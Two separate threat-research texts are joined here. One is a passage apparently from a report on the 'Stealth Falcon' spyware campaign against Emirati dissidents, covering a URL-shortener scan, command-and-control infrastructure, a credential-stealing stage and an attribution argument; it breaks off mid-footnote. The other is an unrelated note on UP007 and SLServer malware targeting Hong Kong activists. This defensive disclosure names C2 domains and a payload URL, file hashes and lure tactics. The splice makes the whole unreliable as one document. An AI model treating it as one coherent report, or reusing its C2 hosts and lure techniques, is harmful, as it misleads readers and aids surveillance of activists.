/aax\\.me\\/[0-9a-f]{5}/.  Assuming all links shortened via aax.me match this regular expression, there are only 165 (1,048,576) possible short URLs.  We sent a request to aax.me for each possible URL, and observed the returned page or redirect.  We found 57 URLs that exhibited the redirect.php profiling behavior, and 524 URLs that returned an HTTP 302 redirect to an expanded URL.  The other 1,047,995 aax.me links returned a HTTP 302 redirect to the aax.me homepage; we assume these short URLs were unassigned to an expanded URL, as of the time of our scan.\nWe coded the long URLs where the URLs were still active, or where we could find an archived copy of, or some information about, the URL.  We were able to code 535 URLs, and failed to code 46 URLs as the corresponding websites were down, and we could not find reliable information about what content the URLs contained.  See Appendix E: Results of aax.me Scan for details.  We coded 133 URLs as “advertisement” (25% of all coded URLs), as they appeared to represent an advertisement for a product.  The vast majority of these advertisements seemed to be products typically marketed via spam (e.g., “dietary supplement” or “green coffee”).  We suspect that these links may have been shortened by spammers, as the aax.me URL shortening page is pubilcly accessible and indexed by Google, and YOURLS advises that publicly accessible URL shorteners will receive spam.83  All “advertisement” links were 302 redirects, and none were redirect.php links.  This is consistent with our observation that the aax.me public interface only permits visitors to shorten links using the 302 redirect method.\nWe filtered out the short URLs classified as “advertisement.”  There were 402 non-advertisement short URLs that we tagged.  We display a summary of the top ten tags below:\n\n\n\nTag\nNumber of Short URLs\n% of non-advertisement URLs\n\n\nUAE\n292\n73%\n\n\nTorture\n57\n14%\n\n\nSecurity Forces\n49\n12%\n\n\nDenaturalization\n46\n11%\n\n\nIsa bin Zayed\n42\n10%\n\n\nRule of Law\n40\n10%\n\n\nCriticism\n40\n10%\n\n\nABC News\n40\n10%\n\n\nViolations\n33\n8%\n\n\nIslam\n29\n7%\n\n\n\nWe noted that a number of long URLs had multiple corresponding short URLs.  We display the top ten long URLs below.\n\n\n\nLong URL\n# Short URLs\nDescription\n\n\nhttp://www.youtube.com/watch?v=F6NU4pc378k\n40\nABC News report featuring video of Abu Dhabi Crown Prince’s brother, Sheikh Isa bin Zayed al-Nahyan, torturing an Afghani grain salesman.\n\n\nhttp://mohaamoon.com/uae/17.htm\n40\nPersonal website criticizing rule of law and human rights issues in the UAE, including torture, slavery, and imprisonment for debts.\n\n\nhttps://r7aluae2.wordpress.com/2012/01/09/اتحاد-المنظمات-الإسلامية-في-أوروبا-يس/\n19\nCopied statement from the Federation of Islamic Organizations in Europe (FIOE), criticizing the UAE’s denaturalization of citizens.\n\n\nhttps://www.a7rarelemarat.com/vb\n10\nPurported to be an opposition web forum for discussing Emirati issues, and providing proxy tools.  The site is now down, so we cannot inspect the specific forum posting.\n\n\nhttp://google.com\n9\nGoogle.\n\n\nhttps://www.a7rarelemarat.com/vb/showthread.php?p=3423#post3423\n6\n(see a7rarelemarat above)\n\n\nhttp://www.youtube.com/watch?v=Xcc9Tdc_Hxg&feature=player_embedded#!\n5\nVideo montage talking about torture by UAE security forces.\n\n\nhttp://www.youtube.com/watch?v=izeSn9Am6us&list=UU2wwG6r1J_GRgXuMGi9m8FQ&index=1&feature=plcp\n5\nVideo unavailable.\n\n\nhttps://www.youtube.com/watch?feature=player_embedded&v=Q3aQpfyXSrg\n5\nVideo published by Al Islah, which appears to be a montage of UAE political detainees.\n\n\nhttps://www.a7rarelemarat.com/vb/forumdisplay.php?f=3\n5\n(see a7rarelemarat above)\n\n\n\n5.3. A Connection to an Account Potentially Under UAE Government Control\nThis section describes a case from December 2012 where an Emirati activist said he received links connected to aax.me from an account that may have been  under UAE government control.\nIn December 2012, an author of this report was contacted by an Emirati activist, who reported that an account, @WeldBudhabi, had sent him a link on 14 December 2012 via Twitter direct message that took him to a page on a7rarelemarat.com.  A report by BBC notes that UAE authorities on 14 December 2012 arrested an individual who they believed to be associated with @WeldBudhabi, and that the account was “reportedly hacked by the authorities” on the same day.84  The Emirati activist told us that he later contacted @WeldBudhabi, who reported that he did not send the link.\nThis link provides the strongest connection between Stealth Falcon and the UAE Authorities that we are aware of.\na7rarelemarat.com is a now-defunct website that purported to be an opposition web forum for discussing Emirati issues, and providing proxy tools for “hiding from the thugs” (presumably a reference to the UAE State Security Apparatus).  We found four links involving aax.me posted by the site’s Twitter account, @a7rarelemarat.  We display two Tweets below, as the rest of the Tweets had the same links:\n\nFigure 14: @a7rarelemarat targeted @WeldBudhabi with a malicious link on 20 October 2012\nTwitter’s API records the date of the tweet’s creation:\nSun Oct 21 05:05:41 +0000 2012\nWe also accessed the goo.gl link statistics, and found that the goo.gl link in the tweet was created less than two minutes prior to the tweet:\n2012-10-21T05:03:45.585+00:00\nThe second tweet exhibited a similar pattern:\n\nFigure 15: @a7rarelemarat publicly sent a malicious link on 2 October 2012\nTwitter’s API records the date of the tweet’s creation:\nWed Oct 03 06:54:33 +0000 2012\nWe again accessed the goo.gl link statistics, and found that the goo.gl link in the tweet was created less than one minute prior to the tweet:\n2012-10-03T06:53:45.151+00:00\nThe link redirects to https://www.a7rarelemarat.com/vb/showthread.php?p=3423#post3423 via http://aax.me/d910a.\nThe use of both goo.gl and aax.me in these cases suggests that the goo.gl link may have been designed to conceal the aax.me domain.  Also, the proximity in creation time between the Tweet and the goo.gl link suggests that the person who posted the Tweet through @a7rarelemarat was likely the same person who created the goo.gl link.\nWe suspect that the aax.me operator had some control over @a7rarelemarat at the time, and may have had control of a7rarelemarat.com as well.\n5.4. Infrastructure Analysis of Stealth Falcon Command & Control\nThis section describes how we traced Stealth Falcon’s spyware to live C2 servers and domain names.\nWe fingerprinted the behavior of adhostingcache.com (the C2 server for the Stage One spyware that Donaghy received) and traced it to a series of 14 active IP adresses and 11 domains (using PassiveTotal85).  Nine domains are named like generic Internet backend servers (e.g., simpleadbanners.com, clickstatistic.com), whereas two appear to be thematically related to travel (bestairlinepricetags.com, fasttravelclearance.com), perhaps indicative of travel-themed targeting or targets.\nWe fingerprinted the behavior of incapsulawebcache.com (the C2 server for the Stage Two spyware that Donaghy receied) and scanned the Internet (including historical scanning results86) for servers that matched our fingerprint.  We also used Passive DNS to correlate IP addresses to domains.  In total, we associated 67 active (and 30 historical) IP addresses with the Stage Two spyware.  Using PassiveTotal, we linked 69 domain names to these IP addresses, the earliest registered on 28 January 2013, and the most recent registered on 19 April 2016.  The vast majority of the domains are named like generic Internet backend servers.  One domain name appears to be travel-themed (airlineadverts.com), and two appear to be news and/or government themed (ministrynewschannel.com, ministrynewsinfo.com).\nThe earliest date we found an IP addresses matching our Stage Two fingerprint was 21 July 2014, as recorded by sonar-ssl scans.  It is possible that the operator used a different configuration of spyware between January 2013 and July 2014.\nWe traced several additional domains to Stealth Falcon using WHOIS information, or Passive DNS.  Of these, one was designed to impersonate a China-based provider of VoIP solutions (yeastarr.com), and two appeared to perhaps contain the Arabic word for security, “amn,” (amnkeysvc.com, amnkeysvcs.com).  Full scan results and other indicators of targeting can be found in Appendix F: Indicators of Targeting.\nThe domain names we found were typically registered with WHOIS privacy providers.  Although, in some cases, we were able to obtain the true registration email through historical WHOIS.  Typically, the operators practiced disciplined operational security: we rarely found an email address that was used to register two domains, and we rarely found two domains linked to the same IP address.\n5.5. May 2016: New Stealth Falcon Document\nIn May 2016, the following document was submitted to VirusTotal:\n\nFilename:  message_032456944343.docm\r\nMD5:       87e1df6f36b96b56186444e37e2a1ef5\r\nSHA1:      1c3757006f972ca957d925accf8bbb3023550d1b\r\nSHA256:    4320204d577ef8b939115d16110e97ff04cb4f7d1e77ba5ce011d43f74abc7be\n\nThe document was similar to the one sent to Donaghy, except that it purported to be encrypted with WordSecure, “a simple, HIPAA .. business-grade software for sharing encrypted files and secure messages with anyone”.87  The bait content was a single line of text reading:\n\nMESSAGE_ERROR: 0E684AD042_(LANGUAGE NOT SUPPORTED)\n\nThe document’s macro was identical to the one sent to Donaghy, except it reported back to, and downloaded Stage Two from a different URL: http://optimizedimghosting.com/wddf/hrrw/ggrr.txt.  The server optimizedimghosting.com matched our Stage One fingerprint for adhostingcache.com.\nWe obtained Stage Two, which appeared to be a newer version of the Stage Two than in Donaghy’s case.  The Stage Two in this case reported back to https://edgecacheimagehosting.com/images/image.nfo.  The server edgecacheimagehosting.com matched our Stage Two fingerprint for incapsulawebcache.com.\nWhen we connected, the Stage Two server sent us additional commands (which we were unable to obtain in Donaghy’s case).  The Stage Two C2 sent us a bundle of 7 commands, that did the following:\n\nGathered system info from WMI\n\nGathered the ARP table\n\nGathered a list of running processes\nMaterialized a file “OracleJavaUpdater.ps1” to disk.  This file gathers passwords and web browser data from a variety of sources: Windows Credential Vault, Internet Explorer, Firefox, Chrome, Outlook.  In general, the file appears to be bespoke attacker code, though some routines are copied from other sources (e.g., some Internet Explorer password gathering code appears to be lifted from the GPLv3-licensed QuasarRAT88)\nExecuted “OracleJavaUpdater.ps1”\nDeleted “OracleJavaUpdater.ps1”\nGathered a list of running processes again\n\nAfter command execution, results were returned to the Stage Two C2.\n \n6. Tip of the Iceberg: Possibly Related Attacks\nWe suspect that the activity we have observed is simply the tip of the iceberg in ongoing attacks against dissidents in the UAE.  Reuse of tactics, techniques and procedures and general carelessness by operators can often lead to discovery of links between campaigns.  We briefly discuss some instances of potentially related attacks below.\n6.1. An Instagram attack?\nWe noticed that one of the Twitter accounts that sent out aax.me links, @um_zainab123, solicited followers for an Instagram account @al7ruae2014.\n\nFigure 16: @um_zainab123 soliciting followers for Instagram account @al7ruae2014 on 26 April 2014\n\nFigure 17: The @al7ruae2014 Instagram account\nWe contacted an activist with knowledge of the UAE94 case, who told us that the @al7ruae2014 Instagram account got in touch with several family members of detainees involved in  the case, and was soliciting information from them via Instagram private message.  The domain name al7ruae2014.com has the same name as the Instagram account, so we suspect it may also be related to the operator.\n6.2. A fake file sharing site?\nWe identified one aax.me link (http://aax.me/4b708) that points to http://velocityfiles.com/download.php?id=a81abdd8a0c0cd1d5d3b6baadcc9eb18.  We visited this link in February 2016, and were served a blank page.  VelocityFiles appears to have been disabled in March 2016.\nWe found that the site purported to be a file hosting site, where users could register and upload files.  However, the registration and signup pages are currently blank, and were blank as of the Internet Archive’s oldest capture of the pages in December 2013.89  We were unable to identify any links to velocityfiles.com from Twitter, or any pages indexed by Google.\nThe design of VelocityFiles appeared to be a loosely modified version of a public website design template.90  Given that the site appears to be designed to pose as a public file sharing service, has no obvious public functionality, and was linked to through aax.me, we suspect that it may have been an attack site.\n\nFigure 18: Comparison between web design template image (left) and VelocityFiles website (right).\nGiven VelocityFiles’ reference to “FREE MD5 HASHING” (their emphasis), it is possible that the value of the id parameter in the URL, a81abdd8a0c0cd1d5d3b6baadcc9eb18, represents the MD5 hash of a file.  We were, however, unable to locate any file with this MD5 hash.\n6.3. Fake web forums?\nWe found an aax.me link91 that pointed to https://call4uaefreedom.com/vb.  The domain was registered on 5/15/2013 and expired on 5/15/2015.  We were unable to find any webpages or tweets linking to this website.  A Google search for “call4uaefreedom” reveals a blog, containing five posts, all within a 30 minute span on 4 June 2013, and an empty Twitter account @call4uaefreedom, created in May 2013.  Given the suspicious activity associated with the alias “call4uaefreedom,” this may have been created by operators.\nWhile searching for domains with similar domain names, we came across uaefreedom.com.  The domain name was first registered on 11 June 2010 by the administrators of UAE Hewar,92 an online discussion forum founded in 2009 that was a frequent government target.  The domain name expired on 11 June 2011, but was re-registered by a different registrant on 7 October 2012.\nOn 16 October 2012, we find the only tweet linking to uaefreedom.com.  A Google search yields no links to the site and we found no passive DNS data available for this domain.  The tweet was sent from account @FreeUAE2012, directed at @uaemot.  An individual based in Qatar was convicted in absentia on 25 December 2013 for running @uaemot.93\n\nFigure 19: @FreeUAE2012 contacts @uaemot with a suspicious link on 16 October 2012\nOther public tweets involving @FreeUAE2012 included two responses94 from Ahmed Mansoor to @FreeUAE2012 on 10 October 2012, regarding the 10 October 2012 Citizen Lab report about how Ahmed Mansoor was targeted with Hacking Team spyware.  The tweets from @FreeUAE2012 to which Ahmed Mansoor was responding appear to have been deleted.\nThree days later, @FreeUAE2012 attempted to convince Ahmed Mansoor that Tor Browser logged private information of its users, posting a screenshot of the Tor Metrics page, which provides non-sensitive data for researchers.95\n\nFigure 20: @FreeUAE2012 attempts to convince Ahmed Mansoor that Tor logs private information of its users\n\n \n7. Attribution\nIn this section, we analyze two competing hypotheses about the identity of Stealth Falcon, and conclude that the balance of evidence suggests Stealth Falcon may be linked to the UAE government.\nHypothesis 1: Stealth Falcon is State Sponsored\nStealth Falcon is a sophisticated threat actor, capable of deploying a wide range of technical and social engineering techniques against a potential target. The operations targeting Donaghy are linked to a series of primarily UAE-focused campaigns against UAE dissidents, starting in January 2012.  While there is no “smoking gun,” several pieces of evidence suggest a connection between Stealth Falcon and the UAE Government.  \nUAE Focused Targeting, Links to Arrests\nThe majority (73%) of bait content on aax.me was focused on UAE-related political issues (Section 5.2). Furthermore, of the 27 victim Twitter accounts we linked to public Stealth Falcon targeting, 24 primarily engaged in political activities, or were otherwise critical of the UAE government (Section 5.1).  Of these 24, we were able to find a subsequent arrest or a conviction in absentia by the UAE government.\nTweets During a Period of Government Control\nA reported case in which a Twitter account apparently under UAE Government control shared a Stealth Falcon link also suggests a connection. \nIn December 2012, an activist contacted us and asserted that an a7rarelemarat.com link was sent to him in a private message from the @WeldBudhabi account the same day that an individual accused of operating the account was arrested, and while the account was “reportedly hacked by authorities”.96  The activist asserted that he contacted an owner of the account, who claimed he did not send that link.  The Twitter account associated with a7rarelemarat.com, @a7rarelemarat, appears to have been under the control of Stealth Falcon at some point during October 2012 (and possibly before and after), as the account sent several aax.me links in October 2012.\nSophisticated Target Knowledge and Operational Security\nStealth Falcon demonstrates some familiarity with the patterns of behavior, interests, and activities of its targets, suggesting that the operators may have been working with other sources of information about their targets’ behaviors.  In addition, Stealth Falcon displayed above-average operational security throughout the campaign.  Some of the social engineering was highly intricate, particularly the email from Andrew Dwight about his ski holiday.  Stealth Falcon also shows familiarity with creating and maintaining a range of fictitious personas, and registering and managing a significant amount of attack and C2 infrastructure with concern for operational security. \nThe infrastructure behind the malware attacks showed good compartmentalization of identities. We rarely found the same (fake) registration information used for more than one C2 domain. Stealth Falcon operators also appear to have deleted one of their attack domains, adhostingcache.com when they realized their attempt to target Donaghy had failed.  We also noted that the (self-signed) SSL certificates on the C2 domains were changed several times as we monitored the infrastructure, perhaps in an attempt to thwart fingerprinting of their infrastructure via SSL certificates.\nThis level of sophistication is consistent with a state sponsored attacker.  Importantly, we found little evidence that indicate criminal or other motivation for the attack, with no evidence of financial or industry targeting.\nWe also note that while some Stealth Falcon domains were registered on anonymousbitcoindomains.com, which is linked to APT28 activities, we found no evidence to support such a connection.  See Appendix G: No Evidence of APT28 Connection for more details.\nHypothesis 2: Stealth Falcon is Not State Sponsored\nWe have considered the possibility that Stealth Falcon’s operators are not state sponsored, but ultimately find little evidence to support this possibility.\nStealth Falcon’s attacks show no evidence of cyber criminal motivations, like financial theft or fraud, nor is there any evidence of attempts to steal intellectual property or conduct other forms of economic espionage. Instead, the targets are politically engaged individuals and public figures. Furthermore, the activity of targets we have been able to identify often concerns domestic UAE issues.  Therefore, we would need to posit an operator with an interest in individuals known for their engagement in domestic UAE issues.\nOther potential motivations might include blackmail or extortion. If this were the case, however, we might expect follow-up interactions between attackers and successful victims, and we would also expect attackers to use off-the-shelf Remote Access Tools (RATs), rather than apparently coding a general-purpose RAT from scratch. This would save them the trouble of needing to load additional malware to exfiltrate files or other material.  We are aware of no evidence of follow-up interactions between the operators and successful victims as part of any extortion attempts.  Furthermore, Stealth Falcon’s use of JavaScript to profile and de-anonymize victims seems inconsistent with a primary motivation of collecting information that could be used for blackmail.\nThe strongest scenario for a non-state sponsored attacker is thus a politically motivated group.  Stealth Falcon targets are primarily individuals known for their criticism of the UAE government. It is perhaps conceivable that a group of pro-government hackers might, without coordination, target these individuals.\nThere are, however, several features of Stealth Falcon’s activities that tell against this possibility. First, there is limited existing evidence that such autonomous groups exist and are active in the UAE.  Given what is known about this kind of group, we might expect such a group to have engaged in defacements, public boasting, or other public-facing activities related to Stealth Falcon’s campaign.  Furthermore, it seems unlikely that a previously unknown political group would have the resources to develop and maintain Stealth Falcon’s fictitious personas and compartmentalized infrastructure.\nEvaluation of Hypotheses\nWe evaluated both hypotheses and found Hypothesis 1: Stealth Falcon is State Sponsored to be the best at explaining the many elements that we have observed. Stealth Falcon’s tactics, resources, and targets all fit with the profile of a state sponsored attacker.  Furthermore, the circumstantial evidence we have presented in this report is suggestive of a link between Stealth Falcon and an entity within the UAE Government.\n \n8. Conclusion: The Big Picture\nStealth Falcon appears to be a new, state sponsored threat actor.  As an operator, Stealth Falcon is distinguished by well informed and sophisticated social engineering, combined with moderately sophisticated97 technical attempts to deanonymize and monitor political targets working on the UAE, and relatively simple malcode.98\nSocial Engineering and the Achilles Heel of Civil Society\nStealth Falcon’s technical approach may not be cutting edge, but the operators are neither unsophisticated or ineffective. Analyzed holistically as an operation, Stealth Falcon is a logical and multi-pronged approach to compromising and unmasking a class of targets.  Stealth Falcon’s campaign highlights the power of social engineering, once a technical bar has been met, in conducting a large scale campaign. \nContemporary social movements and civil society groups rely heavily on the internet for both their core operations, as well as advocacy activities.  Yet these groups are often operating outside a centrally managed IT environment.  The constant sharing of links and materials, as well as regular communications with journalists makes them especially vulnerable to targeting with social engineering.\nHowever, the emphasis on social engineering can also cut in the other direction. Many modern attack techniques require an attacker to interact with a target.  When operators like Stealth Falcon send malicious e-mails and tweets, there are a range of opportunities for retrospective investigation.  As this report shows, the inboxes of targets, for example, are often a more efficient object of investigation than computers themselves, especially once features of a particular campaign are recognized. \nThe Growing Trend of Impersonating Journalists\nStealth Falcon is only the latest example of civil society-focused threat actors impersonating NGOs and journalists to conduct espionage operations. The tactic has been used by a wide range of actors, including Bahrain’s government,99 Packrat in Latin America,100 Iranian groups,101 and China related groups,102 among others. Threat actors seem to gravitate towards this tactic because interacting with journalists is an essential part of civil society activity. It is common for journalists to send unsolicited messages to activists and civil society organizations asking for information, and there is typically a strong incentive for the organization to engage. Indeed, even Western law enforcement agencies have occasionally adopted the approach.103  The reporter-source relationship is protected in many jurisdictions, based on the understanding that protecting this trust is important to a healthy and vibrant civil society.  Tactics that play on this trust are risky, and can quickly contribute to eroding the trust on which civil society is based.\nFinal Note: A Plea for More Research\nImportantly, while we were unable to identify evidence of a conclusive link between Stealth Falcon and a particular sponsor, we have assembled a body of circumstantial evidence that points to an alignment of interests between Stealth Falcon and the UAE Security Forces.  We hope that other researchers will draw from our findings and work to identify additional cases.  Finally, we urge anyone who recalls receiving a link to “aax.me,” or an email from “Andrew Dwight” to contact the authors of this report for further investigation.\n \nAcknowledgements\nSpecial thanks to PassiveTotal and Rori Donaghy.  Thanks to Jeffrey Knockel, Sarah McKune, Chris Doman, Mansoureh Mills.\n \nFootnotes\n\n1 http://www.youthdiplomaticservice.com/zzold-business-blog/category/business\n2 See for example: http://www.middleeasteye.net/news/leaks-show-uae-shipped-weapons-libya-violated-un-resolution-1712843977; http://www.middleeasteye.net/news/uae-paid-pr-firm-millions-brief-uk-journalists-qatar-muslim-brotherhood-attacks-1058875159; http://www.middleeasteye.net/news/leaks-show-uae-shipped-weapons-libya-violated-un-resolution-1712843977; http://www.middleeasteye.net/news/exclusive-emirati-plan-ruling-egypt-2084590756\n3 http://www.middleeasteye.net/users/rori-donaghy\n4 http://www.middleeasteye.net/about-middle-east-eye-1798743352\n5 http://www.echr.org.uk/\n6 http://www.echr.org.uk/?page_id=25\n7 https://freedomhouse.org/report/freedom-world/2015/united-arab-emirates\n8 https://www.hrw.org/world-report/2016/country-chapters/united-arab-emirates\n9 https://www.amnesty.org/en/countries/middle-east-and-north-africa/united-arab-emirates/\n10 https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-marczak.pdf\n11 https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/\n12 https://wikileaks.org/hackingteam/emails/emailid/585453\n13 http://www.uae-embassy.org/news-media/sheikh-mohamed-bin-zayed-al-nahyan-meets-congressional-leaders-and-senior-us-government\n14 https://ht.transparencytoolkit.org/rcs-dev%5Cshare/HOME/cristian/9.4%20lic/UAEAF/LICENSE-1262004202-v9.4.lic\n15 https://owncloud.org/\n16 https://www.proofpoint.com/us/office365\n17 http://righttofightexhibit.org/home/\n18 http://www.powershellempire.com/\n19 http://www.aljazeera.com/indepth/opinion/2015/11/british-pm-middle-east-human-rights-151103070038231.html\n20 Based on last-modified header\n21 http://www.andlabs.org/tools/jsrecon.html\n22 https://media.blackhat.com/bh-ad-10/Kuppan/Blackhat-AD-2010-Kuppan-Attacking-with-HTML5-slides.pdf\n23 https://yourls.org/\n24 https://github.com/YOURLS/YOURLS\n25 A Firefox extension to be used in conjunction with Tor, before the introduction of Tor Browser\n26 Importantly, making Tor users appear similar to non-Tor users was a not a goal\n27 https://trac.torproject.org/projects/tor/ticket/5922\n28 https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-gregory_fleischer-attacking_tor.pdf\n29 https://blog.torproject.org/blog/new-tor-browser-bundles-windows\n30 https://blog.torproject.org/blog/tor-browser-36-released\n31 https://msdn.microsoft.com/en-us/library/2yfce773(v=vs.94).aspx#s-e6f6a65cf14f462597b64ac058dbe1d0-system-media-system-caps-note\n32 https://en.wikipedia.org/wiki/Cross-origin_resource_sharing\n33 https://esupport.trendmicro.com/en-us/home/pages/technical-support/1057722.aspx\n34 http://support.kaspersky.com/us/11255\n35 http://ssj100.fullsubject.com/t446-avira-antivir-premium-allows-all-outbound\n36 http://www.wilderssecurity.com/threads/port-80-is-redirected-to-30606-and-no-webpage-is-opened.212599/\n37 https://community.mcafee.com/thread/21790?tstart=0\n38 The tool is available at: http://www.andlabs.org/tools/jsrecon.html.

Two new malware families are used in this campaign that we name UP007 and SLServer.\nThe UP007 malware family was previously observed by Arbor Security Emergency Response Team (ASERT) in the report “Uncovering the Seven Pointed Dagger,” which analyzes a set of samples that were hosted on the national level electoral commission of Myanmar (Burma): the Myanmar Union Election Commission. One of the samples analyzed was described as “unknown malware”, which we call UP007 based on an identifier in the malware’s network traffic. In a report released today, ASERT describes a series of campaigns targeting Tibetan, Hong Kong, and Taiwanese interests, which also includes details on the same UP007 sample we analyze.\nA recent  PricewaterhouseCoopers (PwC) report includes analysis of the SLServer sample we analyze (PwC refers to the family as SunOrcal). We refer to the malware as SLServer due to a resource dialog in the file. These previous reports collected samples from VirusTotal. We received the original email lure and samples used in the campaign from a targeted source, and found that both UP007 and SLServer were sent to targets in the same attack.\nThis research note builds on previous reporting by more closely examining UP007 and SLServer, variations of these samples found “in the wild”, and the connections between these attacks and other campaigns. Previous reports have shown overlap in the tactics, techniques, and procedures used in this campaign in other operations targeting groups in Burma, Hong Kong, and the Tibetan community. We speculate that either a single threat actor is targeting these groups or some level of formal or informal resource sharing is occurring between the operators behind the campaigns.\nEspionage Campaign Targeting Hong Kong Activists\nIn the week prior to the January 2016 Taiwanese General Election, Hong Kong-based pro-democracy activists received a targeted email purporting to come from a Taiwanese non-profit organization with information about the upcoming election. The email included a Google Drive link to a RAR archive file: “2016總統選舉民情中心預測值.rar”, which translates to “Predictive Forecast from Centre of Public Sentiment in 2016 Presidential Elections.rar”.\nFigure 1: Targeting email sent to Hong Kong democracy activists\nTranslated Email Text:\nTo recipients: Jinshen Tu, Zhifeng Huang, and Xiuxian Zhang. The 2016 general election enters its crucial final 10 days, and 73 electoral districts conclude their voting (1041229); Centre of Public Sentiment’s predicted forecast in the 2016 presidential elections (104.12.28).The 2016 Election enters its crucial final 10 days. On the 6th, Ing-wen Tsai, the DPP (Democratic Progressive Party) candidate, called on DPP supporters to consolidate their votes. She warned that the intense internal competition within the DPP had caused people to be worried about a splitting of the votes, potentially leading to the loss of the 15th and 16th seats.\nThe election day is on the 16th. Besides the presidential election, there is also the legislative election which includes district seats and non-district seats. There are 34 non-district seats in total, of which the DPP won 13 during the last election. Given the higher degree of support this time, the DPP should be able to secure 16 seats. But as the New Power Party’s (NPP) influence and support grows, it might threaten the DPP.\nIn order to promote support for non-district legislators, the DPP Central Standing Committee organized a campaign event this afternoon. The chairwoman of the DPP, Ing-wen Tsai, said there are only ten days left before the election, and the three things she worried the most about were: 1) ballot bribery, which may cause DPP’s loss in certain swing areas; 2) whether young people would return home to vote on Jan 16th; 3) vote splitting that may lead good candidates to lose in non-district legislative elections.\nPredictive Forecast from Centre of Public Sentiment in the 2016 Presidential Elections.rar\n\n\nDelivery Mechanism\nWe have observed the use of Google Drive links as a delivery vector in recent campaigns targeting Tibetan organizations. In these campaigns, Google Drive links were used to send malware and phishing pages. We have also seen the tactic used in recent espionage campaigns targeting an NGO working on environmental issues in Southeast Asia. The prior use of Google Drive as a delivery vector against Tibetan groups is significant, as Tibetan groups are promoting Google Drive as an alternative to sending file attachments to prevent infection from document-based malware.\nExamining the RAR Archive\nWithin the linked RAR archive, the top three directories contain a mix of malicious and benign documents, as well as shortcuts that run two executables that are deeply nested within hidden directories in the archive. The file structure of this archive is shown in Figure 2.\nFigure 2: File structure of delivered RAR archive.\nThe top level directory of this archive contains a benign Word document named 聲明.doc, which translates to “Statement.doc”.  The text of this document is written in Chinese and is related to the Taiwanese election.\nDocument Text:\n73個立委選區選情研判(1041229),\n2016總統選舉民情中心預測值(104.12.28).\n文件內容僅代表個人立場，僅供參閱。解壓選舉民情中心預測值到桌面即可查閱全部數據.\nEnglish Translation:\nElection polling of 73 legislative electoral districts（12/29/104).\nPredicted forecast from Centre of Public Sentiment in the 2016 presidential elections (12/28/104).\nAll the documents represent personal views and are for reference only. Unzip Election Polling Centre’s forecast to the desktop to view all data.\nThe first two directories contain separate Windows shortcuts, each of which runs an executable that is nested down in seven hidden subdirectories. Table 1 shows details of the two executables contained in this nested directory along with their detection rate by antivirus vendors according to VirusTotal.\n\n\n\nFilename\nSample MD5\nAV Detection Rate\n\n\nfzyy.exe\nd579d7a42ff140952da57264614c37bc\nDate / Time: 01-11-2016\nDetection Rate: 8/55\n\n\nwzget.exe\nd8becbd6f188e3fb2c4d23a2d36d137b\nDate / Time: 03-21-2016\nDetection Rate: 30/57\n\n\n\nTable 1: Sample overview \nThese samples, when executed, create two separate infection chains. The lack of emphasis on tricking targets into running a single malicious file is interesting. We are unsure as to why the operators chose to deploy two separate infection chains within the same delivery mechanism. It is also unclear why the benign document was included at the top directory, as this would require more user interaction for a compromise to be successful. It is possible that this mixture of benign and malicious files is intended to lull the targets into a false sense of security.\nWithin the archive there are two Microsoft Word files: 2016總統選舉民情中心預測值.doc (translation: “Predictive forecast from Centre of Public Sentiment in 2016 Presidential Elections”) and 73個立委選區選情研判.doc (translation: “Election polling of 73 legislative electoral districts”). Despite having different filenames, they are the same file (MD5 hash: 09ddd70517cb48a46d9f93644b29c72f). This infected document was analyzed in the recent PwC report and the malware family was named SunOrcal by the researchers. In this report we take a closer look at the two nested executables: fzyy.exe and wzget.exe and the two separate infection chains they produce.\nUP007 Malware Family\nThe fzyy.exe executable is a dropper responsible for creating multiple files and starting this particular infection chain. When the file is run it creates the following files in the directory: %APPDATA%\\Microsoft\\Internet Explorer\\ \n\n\n\nFilename\nMD5\nPurpose\n\n\nconhost.exe\nf70b295c6a5121b918682310ce0c2165\nLoads SBieDll.dll\n\n\nSBieDll.dll\nf80edbb0fcfe7cec17592f61a06e4df2\nLoads maindll.dll\n\n\nmaindll.dll\nd8ede9e6c3a1a30398b0b98130ee3b38\nLoads dll2.xor\n\n\ndll2.xor\nce8ec932be16b69ffa06626b3b423395\nPayload\n\n\nrunas.exe\n6a541de84074a2c4ff99eb43252d9030\nEstablishes persistence; Not utilized in this loading chain\n\n\nnvsvc.exe\ne0eb981ad6be0bd16246d5d442028687\nUnknown – possibly older component\n\n\n\nTable 2: Executable infection chain for fzyy.exe\nThese files are all initially stored as resources within fzyy.exe. Some of the files are stored in encoded form while maindll.dll is stored as a packed executable. When writing the files to disk, the dropper will decode and write the files stored in encoded form. In addition the infection chain will check multiple registry keys before writing maindll.dll.\nThe keys largely seem to check for the presence of popular Chinese antivirus products: 360 Security, Kingsoft Antivirus, Rising AV, Jiangmin, and Micropoint as well as a popular free antivirus product Avira. Interestingly, in this instance, even if the registry keys are present, maindll.dll will still be written and the infection chain will still continue. The registry keys that are checked by the infection chain are summarized in Table 3.\n\n\n\nKey\nSubkey\n\n\nHKLM\\SOFTWARE\\360Safe\\Liveup\ncurl\n\n\nHKCU\\Software\\360safe\nDefaultSkin\n\n\nHKLM\\SOFTWARE\\kingsoft\\Antivirus\nWorkPath\n\n\nHKLM\\SOFTWARE\\Avira\\Avira Destop\nPath\n\n\nHKLM\\SOFTWARE\\rising\\RAV\ninstallpath\n\n\nHKLM\\SOFTWARE\\JiangMin\nInstallPath\n\n\nHKLM\\SOFTWARE\\Micropoint\\Anti-Attack\nMP100000\n\n\n\nTable 3: Registry keys that fzyy.exe checks for before writing maindll.dll\nOnce all the files are created, conhost.exe starts, loads SBieDll.dll, then ultimately loads maindll.dll and the final payload, which we have named UP007 (dll2.xor) due to an identifier in the network traffic. The primary function of UP007 appears to be to log keystrokes to the %USERPROFILE%\\Local Settings\\Temp\\keylog\\ directory and send them to a remote server.\nUP007 uses Windows Sockets to communicate with its command and control server (C2). While doing so, it sends a hardcoded HTTP header disguised as Microsoft Update traffic. This is likely an attempt to escape notice by casual inspection of network traffic. On connection, UP007 downloads another payload directly from the C2 server. This secondary payload we have named “DownLoad” given the way it identifies itself in the traffic with the C2 server. This secondary payload is injected into memory. The initial network traffic observed from the UP007 sample is seen in Figure 3.\nFigure 3: Network capture of the initial communication by UP007.\nOnce the entire payload is received from the C2 server, UP007 sends basic system information such as operating system version, IP address, and username and the C2 responds with a “READY” announcement (see Figure 4).\nFigure 4: Network capture of the infected system sending system information to the C2.\nThe secondary payload (DownLoad) initiates its own separate TCP connection with the C2 server. A sample of the network traffic of this secondary payload is seen in Figure 